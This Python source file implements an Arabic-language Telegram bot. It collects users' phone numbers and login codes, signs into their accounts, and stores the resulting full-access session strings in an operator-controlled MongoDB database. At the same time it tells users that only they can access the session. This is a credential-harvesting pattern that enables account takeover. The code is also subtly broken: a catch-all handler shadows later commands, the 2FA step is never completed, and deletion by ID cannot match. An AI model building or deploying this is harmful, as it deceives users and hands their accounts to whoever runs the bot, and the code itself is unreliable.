import os
import asyncio
import logging
from telethon import TelegramClient, sessions
from telethon.errors import SessionPasswordNeededError
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import pymongo
from datetime import datetime

# ==================== المتغيرات البيئية ====================
TOKEN = os.environ.get("TOKEN")
API_ID = os.environ.get("API_ID")
API_HASH = os.environ.get("API_HASH")
MONGO_URL = os.environ.get("MONGO_URL")

if not all([TOKEN, API_ID, API_HASH, MONGO_URL]):
    raise ValueError("⚠️ المتغيرات البيئية ناقصة!")

API_ID = int(API_ID)

# ==================== اتصال MongoDB ====================
client_mongo = pymongo.MongoClient(MONGO_URL)
db = client_mongo["telegram_sessions"]
collection = db["sessions"]

# ==================== إعداد البوت ====================
bot = AsyncTeleBot(TOKEN)
logging.basicConfig(level=logging.INFO)

user_data = {}

# ==================== الأوامر ====================
@bot.message_handler(commands=['start'])
async def start(message):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("✅ موافق وشروط الاستخدام", callback_data="agree"))
    await bot.send_message(message.chat.id, 
                     "⚠️ **تحذير:** ملف الجلسة يمنح وصول كامل لحسابك.\n"
                     "لا ترسله لأي شخص.\n\n"
                     "📌 الأوامر المتاحة:\n"
                     "/start - القائمة الرئيسية\n"
                     "/gensession - إنشاء جلسة جديدة\n"
                     "/mysessions - عرض جلساتي المحفوظة\n"
                     "/revoke - حذف جلسة معينة",
                     reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(commands=['gensession'])
async def gen_session(message):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("✅ موافق وشروط الاستخدام", callback_data="agree"))
    await bot.send_message(message.chat.id, 
                     "⚠️ **تنبيه أمان:**\n"
                     "سيتم إنشاء جلسة جديدة وحفظها في قاعدة البيانات.\n"
                     "أنت وحدك من يستطيع الوصول إليها.\n\n"
                     "هل توافق؟",
                     reply_markup=markup, parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: call.data == "agree")
async def agree(call):
    await bot.answer_callback_query(call.id)
    msg = await bot.send_message(call.message.chat.id, 
                          "📱 أرسل رقم هاتفك مع المفتاح الدولي\n"
                          "مثال: `+966501234567`\n\n"
                          "أو اضغط /cancel للإلغاء", 
                          parse_mode='Markdown')
    await bot.register_next_step_handler(msg, get_phone)

async def get_phone(message):
    if message.text == '/cancel':
        await bot.send_message(message.chat.id, "❌ تم الإلغاء.")
        return
    
    phone = message.text.strip()
    chat_id = message.chat.id
    user_data[chat_id] = {'phone': phone}
    
    await bot.send_message(chat_id, "⏳ جاري إرسال رمز التحقق...")
    await send_code(chat_id, phone)

async def send_code(chat_id, phone):
    try:
        client = TelegramClient(sessions.StringSession(), API_ID, API_HASH)
        await client.connect()
        result = await client.send_code_request(phone)
        user_data[chat_id]['client'] = client
        user_data[chat_id]['phone_code_hash'] = result.phone_code_hash
        await bot.send_message(chat_id, "🔑 أرسل رمز التحقق (5 أرقام) الذي وصل إليك في Telegram:")
    except Exception as e:
        await bot.send_message(chat_id, f"❌ فشل الإرسال: {str(e)}")

@bot.message_handler(func=lambda m: True)
async def handle_code(message):
    chat_id = message.chat.id
    if chat_id not in user_data or 'client' not in user_data[chat_id]:
        await bot.send_message(chat_id, "❌ ابدأ من جديد بـ /gensession")
        return
    code = message.text.strip()
    await complete_auth(chat_id, code)

async def complete_auth(chat_id, code):
    client = user_data[chat_id]['client']
    phone = user_data[chat_id]['phone']
    phone_code_hash = user_data[chat_id].get('phone_code_hash')
    
    try:
        await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
        session_string = client.session.save()
        await client.disconnect()
        
        session_data = {
            "user_id": chat_id,
            "phone": phone,
            "session_string": session_string,
            "created_at": datetime.utcnow(),
            "is_active": True
        }
        collection.insert_one(session_data)
        
        await bot.send_message(chat_id, 
                        f"✅ **تم حفظ جلسة جديدة!**\n\n"
                        f"📱 الرقم: `{phone}`\n\n"
                        f"🔑 **جلسة النص (String Session):**\n"
                        f"`{session_string}`\n\n"
                        f"⚠️ احتفظ بها بأمان!\n"
                        f"📋 استرجاعها بـ /mysessions",
                        parse_mode='Markdown')
        del user_data[chat_id]
    except SessionPasswordNeededError:
        await bot.send_message(chat_id, "🔐 حسابك مفعل بـ 2FA. أرسل كلمة المرور:")
        user_data[chat_id]['step'] = '2fa'
    except Exception as e:
        await bot.send_message(chat_id, f"❌ خطأ: {str(e)}")
        await client.disconnect()

@bot.message_handler(commands=['mysessions'])
async def my_sessions(message):
    chat_id = message.chat.id
    sessions_list = list(collection.find({"user_id": chat_id, "is_active": True}))
    if not sessions_list:
        await bot.send_message(chat_id, "📭 لا توجد جلسات محفوظة.")
        return
    text = "📋 **جلساتك المحفوظة:**\n\n"
    for i, sess in enumerate(sessions_list, 1):
        text += f"{i}. 📱 {sess['phone']}\n"
        text += f"   🆔 `{sess['_id']}`\n"
        text += f"   📅 {sess['created_at'].strftime('%Y-%m-%d %H:%M')}\n\n"
    await bot.send_message(chat_id, text, parse_mode='Markdown')

@bot.message_handler(commands=['revoke'])
async def revoke_session(message):
    chat_id = message.chat.id
    parts = message.text.split()
    if len(parts) < 2:
        await bot.send_message(chat_id, "❌ أرسل المعرف المراد حذفه:\n`/revoke 65f3a1b2...`", parse_mode='Markdown')
        return
    session_id = parts[1]
    result = collection.delete_one({"_id": session_id, "user_id": chat_id})
    if result.deleted_count > 0:
        await bot.send_message(chat_id, "✅ تم حذف الجلسة بنجاح.")
    else:
        await bot.send_message(chat_id, "❌ لم أجد جلسة بهذا المعرف.")

# ==================== تشغيل البوت ====================
async def main():
    await bot.polling()

if __name__ == "__main__":
    asyncio.run(main())
